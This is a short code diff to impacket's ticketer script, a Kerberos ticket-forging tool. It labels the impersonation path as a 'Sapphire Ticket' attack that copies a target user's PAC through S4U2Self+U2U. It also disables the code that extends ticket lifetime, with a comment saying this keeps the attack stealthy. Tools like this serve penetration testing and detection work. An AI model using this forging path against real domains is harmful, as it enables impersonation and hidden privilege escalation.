@@ -521,6 +521,8 @@ class TICKETER:
         ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
 
         if self.__options.impersonate:
+            # Doing Sapphire Ticket
+            # todo : in its actual form, ticketer is limited to the PAC structures that are supported in impacket. Unsupported structures will be ignored. The PAC is not completely copy-pasted here.
 
             # 1. S4U2Self + U2U
             logging.info('\tRequesting S4U2self+U2U to obtain %s\'s PAC' % self.__options.impersonate)
@@ -535,11 +537,12 @@ class TICKETER:
             encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
 
             # Let's extend the ticket's validity a lil bit
-            encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
-            encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
-            adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]
+            # I don't think this part should be left in the code. The whole point of doing a sapphire ticket is stealth, extending ticket duration is not the way to go
+            # encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
+            # encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
 
             # Opening PAC
+            adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]
             pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
             pacInfos = dict()
             buff = pacType['Buffers']
@@ -973,7 +976,7 @@ if __name__ == '__main__':
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
     group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                        'ommited it use the domain part (FQDN) specified in the target parameter')
-    parser.add_argument('-impersonate', action="store", help='target username that will be impersonated (thru S4U2Self+U2U)'
+    parser.add_argument('-impersonate', action="store", help='Sapphire ticket. target username that will be impersonated (through S4U2Self+U2U)'
                                                              ' for querying the ST and extracting the PAC, which will be'
                                                              ' included in the new ticket')
 
